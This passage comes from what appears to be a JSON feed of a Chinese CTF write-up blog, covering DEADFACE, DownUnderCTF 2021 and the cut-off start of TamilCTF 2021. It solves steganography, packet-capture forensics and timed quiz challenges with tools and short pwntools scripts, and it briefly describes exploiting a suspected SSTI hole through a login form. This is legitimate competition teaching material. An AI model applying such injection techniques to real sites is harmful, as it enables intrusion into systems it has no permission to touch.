ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAK ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg IAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAg ICAgCjw/eHBhY2tldCBlbmQ9InciPz4NCmVuZHN0cmVhbQ1lbmRvYmoNMyAwIG9iag08PC9GaWx0 ZXIvRmxhdGVEZWNvZGUvRmlyc3QgNC9MZW5ndGggNDkvTiAxL1R5cGUvT2JqU3RtPj5zdHJlYW0N CmjeslQwULCx0XfOL80rUTDU985MKY42NAYKBsXqh1QWpOoHJKanFtvZAQQYAOA1C68NCmVuZHN0 cmVhbQ1lbmRvYmoNNCAwIG9iag08PC9GaWx0ZXIvRmxhdGVEZWNvZGUvRmlyc3QgNS9MZW5ndGgg MTI0L04gMS9UeXBlL09ialN0bT4+c3RyZWFtDQpo3pTMsQrCMBRG4Ve5W5Oh7Z+rl6qUQmlWwQfo kjQZuvRCiO+vILg4uZ/zORBoHPul5FB3PXyo2fgbgx0GNzBEGC2kARr7qbSYOWnMNG9FY6j0KEp+ odWcuI17XS2x66RjQC62v2v6Ra98/qLvPT23/Jc6TS8BBgAluTGrDQplbmRzdHJlYW0NZW5kb2Jq DTUgMCBvYmoNPDwvRGVjb2RlUGFybXM8PC9Db2x1bW5zIDQvUHJlZGljdG9yIDEyPj4vRmlsdGVy L0ZsYXRlRGVjb2RlL0lEWzwwMkYzNTg5OTNDMUQxNDRFOENGNkQyRjJBMjc5QUM0Rj48MUVCMkZC MTkyOTFEQ0Q0RDk4Mzk3NzE1OUM5QTc1OTY+XS9JbmZvIDEwIDAgUi9MZW5ndGggNDgvUm9vdCAx MiAwIFIvU2l6ZSAxMS9UeXBlL1hSZWYvV1sxIDIgMV0+PnN0cmVhbQ0KaN5iYgACJkaFKAYmBsY7 QIL3EpBg6AVxbwIlLk4GcRkYYQTTPyDByAAQYACsTAYdDQplbmRzdHJlYW0NZW5kb2JqDXN0YXJ0 eHJlZg0KMTE2DQolJUVPRg0K 在本地解码,保存至flag.pdf ~$ base64 -d encoded &gt; flag.pdf flag:flag&#123;deM0nn3_dat4_4_us&#125; The CountApparently DEADFACE is recruiting programmers, but spookyboi is a little apprehensive about recruiting amateurs. He’s placed a password hash in the form of a flag for those able to solve his challenge. Solve the challenge and submit the flag as flag&#123;SHA256_hash&#125;. Link to Thread code.deadface.io:50000 使用nc命令连接服务器 ╭─ ~/CTF/DEADFACE ╰─$ nc code.deadface.io 50000 DEADFACE gatekeeper: Let us see how good your programming skills are. If a = 0, b = 1, c = 2, etc.. Tell me what the sum of this word is: You have 5 seconds to give me an answer. Your word is: tightfisted Too slow!! Word has been reset! 我们取每一位字符的ASCII码后减去97,求和即可 from pwn import * p = remote(&#39;code.deadface.io&#39;, 50000) x = p.recvline_contains(b&#39;Your word&#39;) word = x.decode().rsplit(&#39;:&#39;)[-1].strip() count = sum([ord(x)-97 for x in word]) p.send(str(count).encode()) print(p.recvline()) print(p.recvline()) print(p.recvline()) flag:flag&#123;d1c037808d23acd0dc0e3b897f344571ddce4b294e742b434888b3d9f69d9944&#125; Behind the CurtainThis image was intercepted from Ghost Town. We think Donnell has hidden information here, but there doesn’t seem to be anything special about the image. Can you help find the hidden information? Submit the flag as flag{this-is-the-flag}. Link to Image SHA1: 29141eea42be29f8fa28a9a1cc5e5118e63577b2 使用Stegsolve打开图片,选择Frame Browser,在Frame 2即可看到flag flag:flag&#123;L3t_m3_in&#125; Scary BunnyWhat could be inside this creepy rabbit? Download image SHA1: 7ab2d9b1986ae12b780d0a2124a3adce6ed4c4e1 使用steghide info查看图片隐写信息 ╭─ ~/CTF/DEADFACE ╰─$ steghide info bunny.jpg &quot;bunny.jpg&quot;: format: jpeg capacity: 2.7 KB Try to get information about embedded data ? (y/n) y Enter passphrase: embedded file &quot;steganopayload730241.txt&quot;: size: 13.0 Byte encrypted: rijndael-128, cbc compressed: yes 使用steghide extract提取隐写的文件steganopayload730241.txt ╭─ ~/CTF/DEADFACE ╰─$ steghide extract -sf bunny.jpg Enter passphrase: the file &quot;steganopayload730241.txt&quot; does already exist. overwrite ? (y/n) y wrote extracted data to &quot;steganopayload730241.txt&quot;. ╭─ ~/CTF/DEADFACE ╰─$ cat steganopayload730241.txt flag&#123;Carr0t&#125; flag:flag&#123;Carr0t&#125; Send in the ClownsThere is a secret hidden somewhere in this image. Can you find it? Submit the flag as flag{this-is-the-flag}. Link to ImageSHA1: 74eaae618bf508ef2715533bfdff3153dd996e89 ╭─ ~/CTF/DEADFACE ╰─$ strings steg02.jpg |grep flag flag&#123;s3nd_in_the_kl0wns&#125; flag:flag&#123;s3nd_in_the_kl0wns&#125; V0icEA friend of mine sent me an audio file which supposes to tell me the time of our night out meeting, but I can’t comprehend the voice in the audio file. Can you help me figure it out? I want to hang out with my friends. Download file SHA1:3173700e9ba2f062a18707b375fac61049310413 用Sonic Visualiser打开midnight.wav,点击Layer-&gt;Add Spectrogram-&gt;midnight.wav: All Channels Mixed 放大后即可看到隐藏在频谱图的flag flag:flag&#123;1257&#125; A WarningLuciafer is being watched! Someone on the inside of Lytton Labs can see what she is doing and is sending her a message. One of them says: “Stay away from Lytton Labs… you have been warned.” To find the flag, find the message. You’ll know it when you see it. Submit the flag as flag&#123;flag-goes-here&#125;. Use the PCAP from LYTTON LABS 01 - Monstrum ex Machina. 使用Wireshark打开pcap-challenge-final.pcapng文件,搜索“warning”,找到一个请求da-warning-message.jpg的HTTP请求 找到该请求对应响应的数据包(16050),对着”JPEG File Interchange Format”右键,选择”显示分组字节”,即可看到flag flag:flag&#123;angels-fear-to-tread&#125; Monster from the MachineOur person on the “inside” of Ghost Town was able to plant a packet sniffing device on Luciafer’s computer. Based on our initial analysis, we know that she was attempting to hack a computer in Lytton Labs, and we have some idea of what she was doing, but we need a more in-depth analysis. This is where YOU come in. We need YOU to help us analyze the packet capture. Look for relevant data to the potential attempted hack. To gather some information on the victim, investigate the victim’s computer activity. The “victim” was using a search engine to look up a name. Provide the name with standard capitalization: flag&#123;Jerry Seinfeld&#125;. Download file SHA1: 6c0caf366dae3e03bcbd7338de0030812536894c 使用Wireshark打开pcap-challenge-final.pcapng文件,按照HTTP过滤 右键,点击”跟踪流”-&gt;”HTTP流” flag:flag&#123;Charles Geschickter&#125; Release the Crackin’!Luciafer cracked a password belonging to the victim. Submit the flag as: flag&#123;password&#125;. Use the PCAP from LYTTON LABS 01 - Monstrum ex Machina. 使用Wireshark打开pcap-challenge-final.pcapng文件,搜索logged,找到正确的密码 flag:flag&#123;darkangel&#125; The SUM of All FEARSAfter hacking a victim’s computer, Luciafer downloaded several files, including two binaries with identical names, but with the extensions .exe and .bin (a Windows binary and a Linux binary, respectively). What are the MD5 hashes of the two tool programs? Submit both hashes as the flag, separated by a |: flag{ExeMD5|BinMD5} Use the PCAP from LYTTON LABS 01 - Monstrum ex Machina. Luciafer下载了两个具有相同名称的二进制文件(分别以.exe和.bin结尾),两个文件的md5值拼接后即为flag 使用Wireshark分析pcap-challenge-final.pcapng文件,发现是下载了lytton-crypt.exe和lytton-crypt.bin两个文件 选中一个接收lytton-crypt.exe文件的数据包,右键点击“跟踪流”-&gt;”TCP流” 然后点击“另存为”,保存为lytton-crypt.exe 重复上述步骤,得到lytton-crypt.bin.然后计算两个文件的md5值 ╭─ ~/CTF/DEADFACE ╰─$ md5 lytton-crypt.* MD5 (lytton-crypt.bin) = 4da8e81ee5b08777871e347a6b296953 MD5 (lytton-crypt.exe) = 9cb9b11484369b95ce35904c691a5b28 flag:flag&#123;9cb9b11484369b95ce35904c691a5b28|4da8e81ee5b08777871e347a6b296953&#125;","date_published":"2021-10-17T18:21:49.000Z","tags":["CTF","CTF","DEADFACECTF"]},{"id":"https://zhaoqi.vip/posts/2302350511/","url":"https://zhaoqi.vip/posts/2302350511/","title":"DownUnderCTF2021 Writeup","content_html":"<h1 id=\"Retro\"><a href=\"#Retro\" class=\"headerlink\" title=\"Retro!\"></a>Retro!</h1><p><em>Our original logo was created in paint, I wonder what other secrets it hides?</em></p>\n<hr>\n<p>题目给了一张图片:</p>\n<img data-src=\"../../CTF/DownUnderCTF2021/Forensics/assets/og.jpg\" alt=\"og\" style=\"zoom:30%;\" />\n\n<p>使用<code>exiftool</code>工具查看图片元数据:</p>\n<p><img data-src=\"/../../CTF/DownUnderCTF2021/Forensics/assets/exiftool.png\" alt=\"exiftool\"></p>\n<p><strong>flag:</strong><code>DUCTF&#123;sicc_paint_skillz!&#125;</code></p>\n<h1 id=\"General-Skills-Quiz\"><a href=\"#General-Skills-Quiz\" class=\"headerlink\" title=\"General Skills Quiz\"></a>General Skills Quiz</h1><p><em>QUIZ TIME! Just answer the questions. Pretty easy right?</em></p>\n<p><em>Author: Crem</em></p>\n<p><em><code>nc pwn-2021.duc.tf 31905</code></em></p>\n<hr>\n<p>本题要求使用<code>nc</code>命令连接远程服务器,并在30s内回答所有问题.</p>\n<p>代码:</p>\n<pre><code class=\"python\">from pwn import *\nfrom urllib.parse import unquote\nimport base64\n\ndef rot13(message):\n    PAIRS = dict(zip(&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;,\n                     &quot;nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM&quot;))\n    return &quot;&quot;.join(PAIRS.get(c, c) for c in message)\n\np = remote(&#39;pwn-2021.duc.tf&#39;, 31905)\np.send(b&#39;\\n&#39;)\np.recvuntil(b&#39;ticking...&#39;, drop=True)\np.recvline()\n\nwhile True:\n    s = p.recvline().decode(&#39;utf-8&#39;).strip(&#39;\\n&#39;)\n    print(s)\n    t = s.split()[-1]\n    print(t)\n    if &#39;1+1=?&#39; in s:\n        p.send(&#39;2&#39;.encode())\n    elif &#39;Decode this hex string and provide me the original number (base 10)&#39; in s:\n        p.send(str(int(t, 16)).encode())\n    elif &#39;Decode this hex string and provide me the original ASCII letter&#39; in s:\n        p.send(chr(int(t, 16)).encode())\n    elif &#39;Decode this URL encoded string and provide me the original ASCII symbols&#39; in s:\n        p.send(unquote(t).encode())\n    elif &#39;Decode this base64 string and provide me the plaintext&#39; in s:\n        p.send(base64.b64decode(t))\n    elif &#39;Encode this plaintext string and provide me the Base64&#39; in s:\n        p.send(base64.b64encode(t.encode()))\n    elif &#39;Decode this rot13 string and provide me the plaintext&#39; in s:\n        p.send(rot13(t).encode())\n    elif &#39;Encode this plaintext string and provide me the ROT13&#39; in s:\n        p.send(rot13(t).encode())\n    elif &#39;Decode this binary string and provide me the original number&#39; in s:\n        p.send(str(int(t, 2)).encode())\n    elif &#39;Encode this number and provide me the binary equivalent&#39; in s:\n        p.send(bin(int(t)).encode())\n    else:\n        p.send(&#39;DUCTF\\n&#39;.encode())\n        print(p.recvall().decode())\n        break\n    p.send(&#39;\\n&#39;.encode())\n    p.recvline()\n    p.recvline()\n</code></pre>\n<p><strong>flag:</strong><code>DUCTF&#123;you_aced_the_quiz!_have_a_gold_star_champion&#125;</code></p>\n<h1 id=\"Who-goes-there\"><a href=\"#Who-goes-there\" class=\"headerlink\" title=\"Who goes there?\"></a>Who goes there?</h1><p><em>Disclaimer: Please note that this storyline, including any previous or future additions are all fictional and created solely for this challenge as part of DownUnder CTF. These are real places however they have <strong>no association&#x2F;affiliation</strong> to the event, you are not required to call any place or make contact with anyone, doing so may disqualify you from the event.</em></p>\n<p><em>Welcome to the team, glad you chose to join us - hopefully you’ll like it here and want to stay. Let me tell you about your first task:</em></p>\n<p><em>We’ve observed an underground criminal RaaS operation calling back to this domain, can you find the number of the individual who registered the domain?</em></p>\n<p><code>646f776e756e646572.xyz</code></p>\n<hr>\n<p>题目给了我们一个域名,要求我们找到注册人的联系电话</p>\n<p>在<a href=\"https://who.is/whois/646f776e756e646572.xyz\">whois</a>上搜索即可:</p>\n<p><img data-src=\"/../../CTF/DownUnderCTF2021/OSINT/assets/whois.png\" alt=\"Whois\"></p>\n<p><strong>flag:</strong><code>DUCTF&#123;+61.420091337&#125;</code></p>\n<h1 id=\"no-strings\"><a href=\"#no-strings\" class=\"headerlink\" title=\"no strings\"></a>no strings</h1><p><em>This binary contains a free flag. No strings attached, seriously!</em></p>\n<hr>\n<p>使用<code>hexdump -C nostrings</code>查看16进制:</p>\n<pre><code class=\"assembly\">00002000  01 00 02 00 00 00 00 00  44 00 55 00 43 00 54 00  |........D.U.C.T.|\n00002010  46 00 7b 00 73 00 74 00  72 00 69 00 6e 00 67 00  |F.&#123;.s.t.r.i.n.g.|\n00002020  65 00 6e 00 74 00 5f 00  73 00 74 00 72 00 69 00  |e.n.t._.s.t.r.i.|\n00002030  6e 00 67 00 73 00 5f 00  73 00 74 00 72 00 69 00  |n.g.s._.s.t.r.i.|\n00002040  6e 00 67 00 7d 00 66 6c  61 67 3f 20 00 77 72 6f  |n.g.&#125;.flag? .wro|\n00002050  6e 67 21 00 63 6f 72 72  65 63 74 21 00 00 00 00  |ng!.correct!....|\n00002060  01 1b 03 3b 34 00 00 00  05 00 00 00 c0 ef ff ff  |...;4...........|\n00002070  68 00 00 00 20 f0 ff ff  50 00 00 00 19 f1 ff ff  |h... ...P.......|\n00002080  90 00 00 00 f0 f1 ff ff  b8 00 00 00 60 f2 ff ff  |............`...|\n00002090  00 01 00 00 00 00 00 00  14 00 00 00 00 00 00 00  |................|\n000020a0  01 7a 52 00 01 78 10 01  1b 0c 07 08 90 01 00 00  |.zR..x..........|\n000020b0  14 00 00 00 1c 00 00 00  c8 ef ff ff 2f 00 00 00  |............/...|\n000020c0  00 44 07 10 00 00 00 00  24 00 00 00 34 00 00 00  |.D......$...4...|\n000020d0  50 ef ff ff 60 00 00 00  00 0e 10 46 0e 18 4a 0f  |P...`......F..J.|\n000020e0  0b 77 08 80 00 3f 1a 3b  2a 33 24 22 00 00 00 00  |.w...?.;*3$&quot;....|\n000020f0  24 00 00 00 5c 00 00 00  81 f0 ff ff d2 00 00 00  |$...\\...........|\n00002100  00 41 0e 10 86 02 43 0d  06 45 83 03 02 c8 0c 07  |.A....C..E......|\n00002110  08 00 00 00 00 00 00 00  44 00 00 00 84 00 00 00  |........D.......|\n00002120  30 f1 ff ff 65 00 00 00  00 46 0e 10 8f 02 49 0e  |0...e....F....I.|\n00002130  18 8e 03 45 0e 20 8d 04  45 0e 28 8c 05 44 0e 30  |...E. ..E.(..D.0|\n00002140  86 06 48 0e 38 83 07 47  0e 40 6e 0e 38 41 0e 30  |..H.8..G.@n.8A.0|\n00002150  41 0e 28 42 0e 20 42 0e  18 42 0e 10 42 0e 08 00  |A.(B. B..B..B...|\n00002160  10 00 00 00 cc 00 00 00  58 f1 ff ff 05 00 00 00  |........X.......|\n00002170  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n</code></pre>\n<p><strong>flag:</strong><code>DUCTF&#123;stringent_strings_string&#125;</code></p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>","content_text":"Retro!Our original logo was created in paint, I wonder what other secrets it hides? 题目给了一张图片: 使用exiftool工具查看图片元数据: flag:DUCTF&#123;sicc_paint_skillz!&#125; General Skills QuizQUIZ TIME! Just answer the questions. Pretty easy right? Author: Crem nc pwn-2021.duc.tf 31905 本题要求使用nc命令连接远程服务器,并在30s内回答所有问题. 代码: from pwn import * from urllib.parse import unquote import base64 def rot13(message): PAIRS = dict(zip(&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;, &quot;nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM&quot;)) return &quot;&quot;.join(PAIRS.get(c, c) for c in message) p = remote(&#39;pwn-2021.duc.tf&#39;, 31905) p.send(b&#39;\\n&#39;) p.recvuntil(b&#39;ticking...&#39;, drop=True) p.recvline() while True: s = p.recvline().decode(&#39;utf-8&#39;).strip(&#39;\\n&#39;) print(s) t = s.split()[-1] print(t) if &#39;1+1=?&#39; in s: p.send(&#39;2&#39;.encode()) elif &#39;Decode this hex string and provide me the original number (base 10)&#39; in s: p.send(str(int(t, 16)).encode()) elif &#39;Decode this hex string and provide me the original ASCII letter&#39; in s: p.send(chr(int(t, 16)).encode()) elif &#39;Decode this URL encoded string and provide me the original ASCII symbols&#39; in s: p.send(unquote(t).encode()) elif &#39;Decode this base64 string and provide me the plaintext&#39; in s: p.send(base64.b64decode(t)) elif &#39;Encode this plaintext string and provide me the Base64&#39; in s: p.send(base64.b64encode(t.encode())) elif &#39;Decode this rot13 string and provide me the plaintext&#39; in s: p.send(rot13(t).encode()) elif &#39;Encode this plaintext string and provide me the ROT13&#39; in s: p.send(rot13(t).encode()) elif &#39;Decode this binary string and provide me the original number&#39; in s: p.send(str(int(t, 2)).encode()) elif &#39;Encode this number and provide me the binary equivalent&#39; in s: p.send(bin(int(t)).encode()) else: p.send(&#39;DUCTF\\n&#39;.encode()) print(p.recvall().decode()) break p.send(&#39;\\n&#39;.encode()) p.recvline() p.recvline() flag:DUCTF&#123;you_aced_the_quiz!_have_a_gold_star_champion&#125; Who goes there?Disclaimer: Please note that this storyline, including any previous or future additions are all fictional and created solely for this challenge as part of DownUnder CTF. These are real places however they have no association&#x2F;affiliation to the event, you are not required to call any place or make contact with anyone, doing so may disqualify you from the event. Welcome to the team, glad you chose to join us - hopefully you’ll like it here and want to stay. Let me tell you about your first task: We’ve observed an underground criminal RaaS operation calling back to this domain, can you find the number of the individual who registered the domain? 646f776e756e646572.xyz 题目给了我们一个域名,要求我们找到注册人的联系电话 在whois上搜索即可: flag:DUCTF&#123;+61.420091337&#125; no stringsThis binary contains a free flag. No strings attached, seriously! 使用hexdump -C nostrings查看16进制: 00002000 01 00 02 00 00 00 00 00 44 00 55 00 43 00 54 00 |........D.U.C.T.| 00002010 46 00 7b 00 73 00 74 00 72 00 69 00 6e 00 67 00 |F.&#123;.s.t.r.i.n.g.| 00002020 65 00 6e 00 74 00 5f 00 73 00 74 00 72 00 69 00 |e.n.t._.s.t.r.i.| 00002030 6e 00 67 00 73 00 5f 00 73 00 74 00 72 00 69 00 |n.g.s._.s.t.r.i.| 00002040 6e 00 67 00 7d 00 66 6c 61 67 3f 20 00 77 72 6f |n.g.&#125;.flag? .wro| 00002050 6e 67 21 00 63 6f 72 72 65 63 74 21 00 00 00 00 |ng!.correct!....| 00002060 01 1b 03 3b 34 00 00 00 05 00 00 00 c0 ef ff ff |...;4...........| 00002070 68 00 00 00 20 f0 ff ff 50 00 00 00 19 f1 ff ff |h... ...P.......| 00002080 90 00 00 00 f0 f1 ff ff b8 00 00 00 60 f2 ff ff |............`...| 00002090 00 01 00 00 00 00 00 00 14 00 00 00 00 00 00 00 |................| 000020a0 01 7a 52 00 01 78 10 01 1b 0c 07 08 90 01 00 00 |.zR..x..........| 000020b0 14 00 00 00 1c 00 00 00 c8 ef ff ff 2f 00 00 00 |............/...| 000020c0 00 44 07 10 00 00 00 00 24 00 00 00 34 00 00 00 |.D......$...4...| 000020d0 50 ef ff ff 60 00 00 00 00 0e 10 46 0e 18 4a 0f |P...`......F..J.| 000020e0 0b 77 08 80 00 3f 1a 3b 2a 33 24 22 00 00 00 00 |.w...?.;*3$&quot;....| 000020f0 24 00 00 00 5c 00 00 00 81 f0 ff ff d2 00 00 00 |$...\\...........| 00002100 00 41 0e 10 86 02 43 0d 06 45 83 03 02 c8 0c 07 |.A....C..E......| 00002110 08 00 00 00 00 00 00 00 44 00 00 00 84 00 00 00 |........D.......| 00002120 30 f1 ff ff 65 00 00 00 00 46 0e 10 8f 02 49 0e |0...e....F....I.| 00002130 18 8e 03 45 0e 20 8d 04 45 0e 28 8c 05 44 0e 30 |...E. ..E.(..D.0| 00002140 86 06 48 0e 38 83 07 47 0e 40 6e 0e 38 41 0e 30 |..H.8..G.@n.8A.0| 00002150 41 0e 28 42 0e 20 42 0e 18 42 0e 10 42 0e 08 00 |A.(B. B..B..B...| 00002160 10 00 00 00 cc 00 00 00 58 f1 ff ff 05 00 00 00 |........X.......| 00002170 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| flag:DUCTF&#123;stringent_strings_string&#125;","summary":"Retro!Our original logo was created in paint, I wonder what other secrets it hides? 题目给了一张图片: 使用exiftool工具查看图片元数据: flag:DUCTF&#123;sicc_paint_skillz!&#125; General Skills QuizQUIZ TIME! Just answer the questions. Pretty easy right? Author: Crem nc pwn-2021.duc.tf 31905 本题要求使用nc命令连接远程服务器,并在30s内回答所有问题. 代码: from pwn import * from urllib.parse import unquote import base64 def rot13(message): PAIRS = dict(zip(&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;, &quot;nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM&quot;)) return &quot;&quot;.join(PAIRS.get(c, c) for c in message) p = remote(&#39;pwn-2021.duc.tf&#39;, 31905) p.send(b&#39;\\n&#39;) p.recvuntil(b&#39;ticking...&#39;, drop=True) p.recvline() while True: s = p.recvline().decode(&#39;utf-8&#39;).strip(&#39;\\n&#39;) print(s) t = s.split()[-1] print(t) if &#39;1+1=?&#39; in s: p.send(&#39;2&#39;.encode()) elif &#39;Decode this hex string and provide me the original number (base 10)&#39; in s: p.send(str(int(t, 16)).encode()) elif &#39;Decode this hex string and provide me the original ASCII letter&#39; in s: p.send(chr(int(t, 16)).encode()) elif &#39;Decode this URL encoded string and provide me the original ASCII symbols&#39; in s: p.send(unquote(t).encode()) elif &#39;Decode this base64 string and provide me the plaintext&#39; in s: p.send(base64.b64decode(t)) elif &#39;Encode this plaintext string and provide me the Base64&#39; in s: p.send(base64.b64encode(t.encode())) elif &#39;Decode this rot13 string and provide me the plaintext&#39; in s: p.send(rot13(t).encode()) elif &#39;Encode this plaintext string and provide me the ROT13&#39; in s: p.send(rot13(t).encode()) elif &#39;Decode this binary string and provide me the original number&#39; in s: p.send(str(int(t, 2)).encode()) elif &#39;Encode this number and provide me the binary equivalent&#39; in s: p.send(bin(int(t)).encode()) else: p.send(&#39;DUCTF\\n&#39;.encode()) print(p.recvall().decode()) break p.send(&#39;\\n&#39;.encode()) p.recvline() p.recvline() flag:DUCTF&#123;you_aced_the_quiz!_have_a_gold_star_champion&#125; Who goes there?Disclaimer: Please note that this storyline, including any previous or future additions are all fictional and created solely for this challenge as part of DownUnder CTF. These are real places however they have no association&#x2F;affiliation to the event, you are not required to call any place or make contact with anyone, doing so may disqualify you from the event. Welcome to the team, glad you chose to join us - hopefully you’ll like it here and want to stay. Let me tell you about your first task: We’ve observed an underground criminal RaaS operation calling back to this domain, can you find the number of the individual who registered the domain? 646f776e756e646572.xyz 题目给了我们一个域名,要求我们找到注册人的联系电话 在whois上搜索即可: flag:DUCTF&#123;+61.420091337&#125; no stringsThis binary contains a free flag. No strings attached, seriously! 使用hexdump -C nostrings查看16进制: 00002000 01 00 02 00 00 00 00 00 44 00 55 00 43 00 54 00 |........D.U.C.T.| 00002010 46 00 7b 00 73 00 74 00 72 00 69 00 6e 00 67 00 |F.&#123;.s.t.r.i.n.g.| 00002020 65 00 6e 00 74 00 5f 00 73 00 74 00 72 00 69 00 |e.n.t._.s.t.r.i.| 00002030 6e 00 67 00 73 00 5f 00 73 00 74 00 72 00 69 00 |n.g.s._.s.t.r.i.| 00002040 6e 00 67 00 7d 00 66 6c 61 67 3f 20 00 77 72 6f |n.g.&#125;.flag? .wro| 00002050 6e 67 21 00 63 6f 72 72 65 63 74 21 00 00 00 00 |ng!.correct!....| 00002060 01 1b 03 3b 34 00 00 00 05 00 00 00 c0 ef ff ff |...;4...........| 00002070 68 00 00 00 20 f0 ff ff 50 00 00 00 19 f1 ff ff |h... ...P.......| 00002080 90 00 00 00 f0 f1 ff ff b8 00 00 00 60 f2 ff ff |............`...| 00002090 00 01 00 00 00 00 00 00 14 00 00 00 00 00 00 00 |................| 000020a0 01 7a 52 00 01 78 10 01 1b 0c 07 08 90 01 00 00 |.zR..x..........| 000020b0 14 00 00 00 1c 00 00 00 c8 ef ff ff 2f 00 00 00 |............/...| 000020c0 00 44 07 10 00 00 00 00 24 00 00 00 34 00 00 00 |.D......$...4...| 000020d0 50 ef ff ff 60 00 00 00 00 0e 10 46 0e 18 4a 0f |P...`......F..J.| 000020e0 0b 77 08 80 00 3f 1a 3b 2a 33 24 22 00 00 00 00 |.w...?.;*3$&quot;....| 000020f0 24 00 00 00 5c 00 00 00 81 f0 ff ff d2 00 00 00 |$...\\...........| 00002100 00 41 0e 10 86 02 43 0d 06 45 83 03 02 c8 0c 07 |.A....C..E......| 00002110 08 00 00 00 00 00 00 00 44 00 00 00 84 00 00 00 |........D.......| 00002120 30 f1 ff ff 65 00 00 00 00 46 0e 10 8f 02 49 0e |0...e....F....I.| 00002130 18 8e 03 45 0e 20 8d 04 45 0e 28 8c 05 44 0e 30 |...E. ..E.(..D.0| 00002140 86 06 48 0e 38 83 07 47 0e 40 6e 0e 38 41 0e 30 |..H.8..G.@n.8A.0| 00002150 41 0e 28 42 0e 20 42 0e 18 42 0e 10 42 0e 08 00 |A.(B. B..B..B...| 00002160 10 00 00 00 cc 00 00 00 58 f1 ff ff 05 00 00 00 |........X.......| 00002170 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| flag:DUCTF&#123;stringent_strings_string&#125;","date_published":"2021-10-09T08:53:47.000Z","tags":["CTF","CTF","DownUnderCTF2021"]},{"id":"https://zhaoqi.vip/posts/2827311957/","url":"https://zhaoqi.vip/posts/2827311957/","title":"TamilCTF2021 Writeup","content_html":"<h1 id=\"Open-Flag\"><a href=\"#Open-Flag\" class=\"headerlink\" title=\"Open Flag\"></a>Open Flag</h1><hr>\n<p>访问题目中给出的链接,发现是一个登录页面<br><img data-src=\"../../CTF/TamilCTF2021/Web/images/login.png\" alt=\"Open Flag\" style=\"zoom:80%;\" /><br>随便输入一个用户名和密码直接可以登录,提示我们flag文件的路径是<code>./flag.jpg</code>.<br>F12看源码发现注释中会显示刚才登录所用的用户名,猜测存在SSTI漏洞,直接用注入代码作为用户名登录即可<br><img data-src=\"../../CTF/TamilCTF2021/Web/images/image-20211119203608270.jpg\" 